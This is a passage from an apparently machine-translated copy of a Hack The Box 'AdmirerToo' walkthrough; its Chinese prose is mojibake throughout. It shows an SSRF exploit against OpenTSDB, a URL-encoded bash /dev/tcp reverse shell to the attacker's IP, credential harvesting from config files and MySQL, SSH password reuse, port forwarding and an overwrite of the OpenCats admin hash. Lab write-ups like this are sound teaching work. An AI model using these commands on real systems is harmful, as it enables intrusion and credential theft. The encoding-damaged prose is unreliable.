translated">å•å‡»forwardï¼Œæ‚¨å°†çœ‹åˆ°ä¸€ä¸ªæ‰“å—å¼çš„GETè¯·æ±‚:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/c563725ca740ec7fae7b676a47c9b4a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7UgwOfs4sLFJgd9W.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">é€šè¿‡æ‰“å—æ‹¦æˆªè¯·æ±‚</figcaption></figure><p id="d311" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å†æ¬¡å•å‡»forwardï¼Œåˆ‡æ¢å›æµè§ˆå™¨ä»¥æŸ¥çœ‹åå°„çš„è¾“å‡º:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oa"><img src="../Images/0ba4c43ea3fbcbceeef78ed66cfd5a76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*s9-pFt73jalhGBtM.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">åœ¨ç½‘ç«™ä¸ŠæŸ¥çœ‹åæ˜ çš„è¾“å‡º</figcaption></figure><h1 id="6292" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">OpenTSDB</h1><p id="9af1" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">å¯ä»¥çœ‹åˆ°é¡µé¢æ ‡é¢˜å†™ç€OpenTSDBã€‚æˆ‘ä»æœªå¬è¯´è¿‡è¿™ä¸ªï¼Œä½†å¿«é€Ÿæœç´¢å‘ç°GitHub repoä¸ºå®ƒ<a class="ae nu" href="https://github.com/OpenTSDB/opentsdb" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>ã€‚å¯»æ‰¾æ¼æ´å‘ç°<a class="ae nu" href="https://nvd.nist.gov/vuln/detail/CVE-2020-35476" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a> CVEï¼Œä¸ä¸€ä¸ªPOC <a class="ae nu" href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-35476.yaml" rel="noopener ugc nofollow" target="_blank">åœ¨è¿™é‡Œ</a>è¯•å›¾æ³„æ¼å¯†ç æ–‡ä»¶ã€‚æˆ‘è¿˜åœ¨è¿™ä¸ªé¡¹ç›®çš„<a class="ae nu" href="https://github.com/OpenTSDB/opentsdb/issues/2051" rel="noopener ugc nofollow" target="_blank">ä¸­æ‰¾åˆ°äº†æ›´å¤šçš„ä¿¡æ¯ã€‚</a></p><p id="2037" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ‰€ä»¥æˆ‘ä½¿ç”¨äº†è¿™ä¸ªä¾‹å­ï¼Œå¹¶æŠŠæˆ‘çš„é‡å®šå‘å™¨ä¿®æ”¹æˆè¿™æ ·:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ob"><img src="../Images/4ee020c41d66a1e1ba8cd897e53be1a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8eRZ2-i9CEzJYbsywo1kCQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Pythonè¿è¡Œæˆ‘ä»¬çš„SSRFæ¼æ´</figcaption></figure><p id="c778" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¿™å¾ˆéš¾é˜…è¯»ï¼Œä½†æˆ‘æ­£åœ¨åˆ©ç”¨æ¼æ´åšä¸€ä¸ªå¯†ç æ–‡ä»¶çš„çŒ«ã€‚å’Œä»¥å‰ä¸€æ ·ï¼Œå›åˆ°æµè§ˆå™¨ï¼Œè®©Burpæ‹¦æˆªï¼Œå•å‡»è¾“å…¥æ•è·è¯·æ±‚ï¼Œå¹¶æ›´æ”¹auth[driver]å’Œauth[server],å°±åƒæˆ‘ä»¬ä¸Šæ¬¡åšçš„é‚£æ ·ã€‚è½¬å‘å®ƒï¼Œå›åˆ°æµè§ˆå™¨ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oc"><img src="../Images/870cd2f4f73575ef97824569aa2575c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ArTDUmtZnluAYODH.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">é”™è¯¯æ˜¾ç¤ºæŒ‡æ ‡ä¸å¯ç”¨</figcaption></figure><p id="06c7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä¸€ä¸ªå¾ˆé•¿çš„é”™è¯¯åˆ—è¡¨ï¼Œæœ«å°¾çš„é‡è¦ä½è¢«çªå‡ºæ˜¾ç¤ºã€‚æ²¡æœ‰sys.cpu.niceè¿™æ ·çš„æŒ‡æ ‡ã€‚æœç´¢åœ¨StackOverflowä¸Šæ‰¾åˆ°äº†<a class="ae nu" href="https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http" rel="noopener ugc nofollow" target="_blank"> this </a>ä»¥åˆ—å‡ºå¯ç”¨çš„æŒ‡æ ‡ã€‚æ›´æ”¹æˆ‘ä»¬çš„é‡å®šå‘å™¨:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="7781" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# python2 redirect.py --port 80 'http://127.0.0.1:4242/api/suggest?type=metrics'<br/>serving at port 80</span></pre><p id="df52" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å›åˆ°æµè§ˆå™¨ï¼Œç”¨æ‰“å—ç­‰æ–¹å¼æ‹¦æˆªã€‚è½¬å‘åï¼Œæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­çœ‹åˆ°ä»¥ä¸‹å“åº”:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/4401fbd88547f5791d21c1b9bd369e24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/0*cZykyStsVJ6pW720.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">åå°„çš„å“åº”æ˜¾ç¤ºå¯ç”¨çš„åº¦é‡</figcaption></figure><p id="3591" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ‰€ä»¥ç°åœ¨æˆ‘ä»¬çŸ¥é“å”¯ä¸€å¯ç”¨çš„åº¦é‡æ˜¯http.stats.web.hitsã€‚æˆ‘èŠ±äº†å¾ˆé•¿æ—¶é—´è¯•å›¾ä½¿ç”¨è¿™ä¸ªåº¦é‡åœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºpasswdæ–‡ä»¶æˆ–ä»»ä½•å…¶ä»–æ–‡ä»¶ã€‚æˆ‘æ²¡æœ‰å¾—åˆ°ä¸€ä¸ªé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ç¡®ä¿¡æˆ‘å¾—åˆ°äº†æ­£ç¡®çš„å‚æ•°ã€‚æœ€åæˆ‘ç”¨äº†ç¬¬ä¸€æ¬¡æˆåŠŸçš„åå‘å¤–å£³ï¼</p><h1 id="9952" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åå‘å¤–å£³</h1><p id="c5fd" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">æˆ‘ç”¨è¿™ä¸ªç®€å•çš„åå‘å¤–å£³:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="19cc" class="nn kg iq nj b gy no np l nq nr">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.95/1337 0&gt;&amp;1"'</span></pre><p id="83c1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘å¯¹å®ƒè¿›è¡Œäº†URLç¼–ç ï¼Œæ‰€ä»¥å®ƒçœ‹èµ·æ¥åƒè¿™æ ·:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="9375" class="nn kg iq nj b gy no np l nq nr">%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%39%35%2f%31%33%33%37%20%30%3e%26%31%22%27</span></pre><p id="9ba9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç„¶åï¼Œæˆ‘å¯åŠ¨äº†é‡å®šå‘å™¨ï¼Œå°†å®ƒä½œä¸ºè¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="67ff" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# python2 redirect.py --port 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%39%35%2f%34%34%34%34%20%30%3e%26%31%22%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'<br/>serving at port 80</span></pre><p id="c07d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å›åˆ°æµè§ˆå™¨ï¼Œç”¨æ‰“å—ç­‰æ–¹å¼æ‹¦æˆªã€‚æ ¹æ®è¯·æ±‚ä»¥æ‰“å—çš„æ–¹å¼è½¬å‘ï¼Œç„¶åè¿”å›åˆ°ç»ˆç«¯ä»¥æŸ¥çœ‹æˆ‘ä»¬æ˜¯å¦å·²è¿æ¥:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="4d67" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# nc -nlvp 4444 <br/>listening on [any] 4444 ...<br/>connect to [10.10.16.95] from (UNKNOWN) [10.10.11.137] 58776<br/>opentsdb@admirertoo:/$</span></pre><p id="68d8" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨æˆ‘ä»¬åšä»»ä½•äº‹æƒ…ä¹‹å‰å‡çº§shell:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e422" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/$ which python<br/>/bin/python<br/>opentsdb@admirertoo:/$ python -c 'import pty;pty.spawn("/bin/bash")'<br/>opentsdb@admirertoo:/$ ^Z    <br/>zsh: suspended  nc -nlvp 4444<br/>â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# stty raw -echo; fg<br/>opentsdb@admirertoo:/$ stty rows 51 cols 236<br/>opentsdb@admirertoo:/$ export TERM=xterm</span></pre><h1 id="4588" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">OpenCats</h1><p id="76fe" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç¯é¡¾å››å‘¨ï¼Œæˆ‘åœ¨/optæ–‡ä»¶å¤¹ä¸­å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="0559" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:~$ ls -l /opt<br/>drwxr-xr-x  9 root hbase 4096 Jul  8  2021 hbase<br/>drwxr-xr-x 23 root root  4096 Jul 21  2021 opencats</span></pre><p id="ae13" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨é‚£ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œè‡ªè¿°æ–‡ä»¶å°†æˆ‘ä»¬æŒ‡å‘è¿™é‡Œçš„æ–‡æ¡£<a class="ae nu" href="https://opencats-documentation.readthedocs.io/en/latest/introduction.html" rel="noopener ugc nofollow" target="_blank"/>ã€‚è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªå…è´¹çš„æ‹›è˜ç³»ç»Ÿï¼Œæˆ‘åœ¨æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ•°æ®åº“å‡­æ®:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="2a1d" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/opt/opencats$ more config.php<br/>&lt;?php<br/>/*<br/> * CATS<br/> * Configuration File<br/> *<br/>&lt;SNIP&gt;<br/>/* Database configuration. */<br/>define('DATABASE_USER', 'cats');<br/>define('DATABASE_PASS', 'adm1r3r0fc4ts');<br/>define('DATABASE_HOST', 'localhost');<br/>define('DATABASE_NAME', 'cats_dev');</span></pre><h1 id="e07c" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">MySQLæšä¸¾</h1><p id="a3ad" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ•°æ®åº“:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="819e" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/opt/opencats$ find / -name cats_dev 2&gt;/dev/null<br/>/var/lib/mysql/cats_dev</span></pre><p id="e224" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æœ‰äº†å‡­è¯ï¼Œæˆ‘ä»¬å¯ä»¥æšä¸¾æ•°æ®åº“å’Œè½¬å‚¨ç”¨æˆ·:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="01ff" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -e 'show databases;'<br/>+--------------------+<br/>| Database           |<br/>+--------------------+<br/>| cats_dev           |<br/>| information_schema |<br/>+--------------------+</span><span id="49ea" class="nn kg iq nj b gy nv np l nq nr">opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -e 'show tables from cats_dev;'<br/>+--------------------------------------+<br/>| Tables_in_cats_dev                   |<br/>+--------------------------------------+<br/>| access_level                         |<br/>&lt;SNIP&gt;<br/>| user                                 |<br/>| user_login                           |<br/>| word_verification                    |<br/>| xml_feed_submits                     |<br/>| xml_feeds                            |<br/>| zipcodes                             |<br/>+--------------------------------------+</span><span id="d761" class="nn kg iq nj b gy nv np l nq nr">opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -e 'show columns in user from cats_dev;'<br/>+---------------------------+--------------+------+-----+---------+<br/>| Field                     | Type         | Null | Key | Default |<br/>+---------------------------+--------------+------+-----+---------+<br/>| user_id                   | int(11)      | NO   | PRI | NULL    |<br/>| site_id                   | int(11)      | NO   | MUL | 0       |<br/>| user_name                 | varchar(64)  | NO   |     |         |<br/>| email                     | varchar(128) | YES  |     | NULL    |<br/>| password                  | varchar(128) | NO   |     |         |<br/>&lt;SNIP&gt;<br/>| can_see_eeo_info          | int(1)       | YES  |     | 0       |<br/>+---------------------------+--------------+------+-----+---------+</span><span id="40f5" class="nn kg iq nj b gy nv np l nq nr">opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -D cats_dev -e 'select user_name,password from user;'<br/>+----------------+----------------------------------+<br/>| user_name      | password                         |<br/>+----------------+----------------------------------+<br/>| admin          | dfa2a420a4e48de6fe481c90e295fe97 |<br/>| cats@rootadmin | cantlogin                        |<br/>| jennifer       | f59f297aa82171cc860d76c390ce7f3e |<br/>+----------------+----------------------------------+</span></pre><p id="7028" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘æ— æ³•ç ´è§£è¿™äº›md5å“ˆå¸Œï¼Œæ‰€ä»¥ç°åœ¨è¿™æ˜¯ä¸€ä¸ªæ­»èƒ¡åŒã€‚æ˜¯æ—¶å€™å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæ›´å¤šçš„æšä¸¾äº†ï¼Œæˆ‘æœ€ç»ˆæ‰¾åˆ°äº†æ›´å¤šçš„å‡­è¯:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="013d" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/var/www/adminer$ grep -rl "pass*" . 2&gt;/dev/null<br/>./plugins/data/servers.php<br/>./plugins/oneclick-login.php<br/>./plugins/plugin.php<br/>./adminer-included-0ae90598f37b20e3e7eb122c427729ed.php<br/><br/>opentsdb@admirertoo:/var/www/adminer$ cat plugins/data/servers.php<br/>&lt;?php<br/>return [<br/>  'localhost' =&gt; array(<br/>//    'username' =&gt; 'admirer',<br/>//    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3',<br/>// Read-only account for testing<br/>    'username' =&gt; 'admirer_ro',<br/>    'pass'     =&gt; '1w4nn4b3adm1r3d2!',<br/>    'label'    =&gt; 'MySQL',<br/>    'databases' =&gt; array(<br/>      'admirer' =&gt; 'Admirer DB',<br/>    )<br/>  ),<br/>];</span></pre><p id="ed5c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">çœ‹çœ‹å¯ä»¥ç™»å½•æœºå™¨çš„ç”¨æˆ·ï¼Œæˆ‘ä»¬åªçœ‹åˆ°ä¸€ä¸ª:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="378e" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/var/www/adminer$ ls -l /home<br/>drwxr-xr-x 3 jennifer users 4096 Feb 22 20:58 jennifer</span></pre><h1 id="b972" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">å®‹æ‰¿å®ªé¥°æ¼”è©¹å¦®å¼—</h1><p id="fa55" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">åŸæ¥ä¸Šé¢çš„å¯†ç è¢«jenniferé‡å¤ä½¿ç”¨äº†:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a873" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# ssh jennifer@admirer-gallery.htb<br/>jennifer@admirer-gallery.htbs password:<br/>Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1<br/>No mail.<br/>Last login: Wed Mar  2 22:02:08 2022 from 10.10.14.160<br/>jennifer@admirertoo:~$</span></pre><p id="573d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„æœåŠ¡ï¼Œå¯ä»¥çœ‹åˆ°ä¸€äº›ç«¯å£åœ¨æœ¬åœ°ä¾¦å¬:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi od"><img src="../Images/112b15f7506fca38bc56826312a9a913.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qBawQbrwiU5u3p_hbP2p3w.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">netstatæ˜¾ç¤ºæœ¬åœ°ç›‘å¬æœåŠ¡</figcaption></figure><p id="9362" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">8080ç«¯å£ç»å¸¸ç”¨äºç½‘ç«™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨curlæ¥æŸ¥çœ‹:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="8e7c" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ curl 127.0.0.1:8080<br/>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"<br/>"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;<br/>&lt;html&gt;<br/>&lt;head&gt;<br/>&lt;title&gt;opencats - Login&lt;/title&gt;</span></pre><h1 id="365d" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SSHç«¯å£è½¬å‘</h1><p id="9289" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">è¿™æ˜¯æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„OpenCatsçš„ç™»å½•é¡µé¢ã€‚è®©æˆ‘ä»¬å»ºç«‹ä¸€ä¸ªä»Kaliåˆ°boxçš„SSHéš§é“ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŸ¥çœ‹è¯¥ç½‘ç«™:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="cc33" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# ssh -L 1234:127.0.0.1:8080 jennifer@admirer-gallery.htb<br/>jennifer@admirer-gallery.htb's password:<br/>Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1<br/>Last login: Wed Mar  2 23:07:19 2022 from 10.10.14.169<br/>jennifer@admirertoo:~$</span></pre><p id="909a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç°åœ¨ï¼Œåœ¨Kaliä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æµè§ˆåˆ°ç«¯å£1234ï¼Œå¹¶å°†é€šè¿‡SSHéš§é“è½¬å‘åˆ°æœºå™¨ä¸Šçš„ç«¯å£8080:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/30d928fd440a36dea80afb0a0cb4d3a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1144/format:webp/0*x_dwXfo6iuePSjZc.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">OpenCatsç™»å½•é¡µé¢</figcaption></figure><h1 id="4ac1" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">OpenCatsæ¼æ´</h1><p id="4a0d" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç™»å½•é¡µé¢æ˜¾ç¤ºç‰ˆæœ¬æ˜¯0.9.5.2ï¼Œæœç´¢å‘ç°ä¸¤ä¸ªCVEã€‚<a class="ae nu" href="https://www.opencve.io/cve/CVE-2021-25294" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æ˜¯ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ï¼Œ<a class="ae nu" href="https://www.opencve.io/cve/CVE-2021-25295" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æ˜¯XXSé—®é¢˜ã€‚ä¸¤è€…éƒ½æŒ‡å‘è¿™é‡Œçš„<a class="ae nu" href="https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html" rel="noopener ugc nofollow" target="_blank">æŠ€æœ¯èµ°ä½ã€‚</a></p><p id="561e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä¸ºäº†èƒ½å¤Ÿåˆ©ç”¨è¿™äº›æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦æœ‰æ•ˆçš„å‡­è¯æ¥è¿›å…¥OpenCATSä»ªè¡¨æ¿ã€‚æ—©äº›æ—¶å€™æˆ‘ä»OpenCATSä½¿ç”¨çš„MySQLæ•°æ®åº“ä¸­æ‰¾åˆ°äº†ç”¨æˆ·å’Œå“ˆå¸Œï¼Œä½†æˆ‘æ— æ³•ç ´è§£å®ƒä»¬ã€‚ç›¸åï¼Œå¯¹äºæ•°æ®åº“çš„ç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºç®¡ç†å‘˜å¸æˆ·è®¾ç½®ä¸€ä¸ªæ–°å¯†ç ã€‚</p><p id="c0f0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä¸ºæˆ‘çš„å¯†ç åˆ›å»ºä¸€ä¸ªmd5æ•£åˆ—ï¼Œå®ƒæ˜¯pencer:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="4830" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ echo -n pencer | md5sum<br/>b8ea4ab13b0e0864760dbfb9427f31fc  -</span></pre><p id="5795" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°ç®¡ç†å‘˜å¸æˆ·çš„user_id:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f388" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ mysql -u cats -padm1r3r0fc4ts -D cats_dev -e 'select user_id,user_name,password from user;'<br/>+---------+----------------+----------------------------------+<br/>| user_id | user_name      | password                         |<br/>+---------+----------------+----------------------------------+<br/>|       1 | admin          | dfa2a420a4e48de6fe481c90e295fe97 |<br/>|    1250 | cats@rootadmin | cantlogin                        |<br/>|    1251 | jennifer       | f59f297aa82171cc860d76c390ce7f3e |<br/>+---------+----------------+----------------------------------+</span></pre><p id="6f7c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å°†å¯†ç æ›´æ”¹ä¸ºæˆ‘çš„å“ˆå¸Œç‰ˆæœ¬:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="4934" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ mysql -u cats -padm1r3r0fc4ts -D cats_dev -e 'update user set password = "b8ea4ab13b0e0864760dbfb9427f31fc" where user_id = 1;'</span></pre><h1 id="46c5" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">OpenCatsä½œä¸ºç®¡ç†å‘˜</h1><p id="981a" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç°åœ¨å›åˆ°OpenCATSç™»å½•æ¡†ï¼Œä½¿ç”¨admin:pencerè¿›å…¥ä»ªè¡¨æ¿:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi of"><img src="../Images/e9f537888bbe82931dcd47c77bbddaf5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*xiJ4r6dvB349xirf.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•OpenCatsä¸»é¡µ</figcaption></figure><p id="8446" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¯¥æ¼æ´è¯´æ˜activitieséƒ¨åˆ†ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–å‡½æ•°ã€‚å¼€å§‹æ‰“å—ï¼Œå‡†å¤‡å¥½æ‹¦æˆªï¼Œç„¶åç‚¹å‡»æ—¥æœŸ:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi og"><img 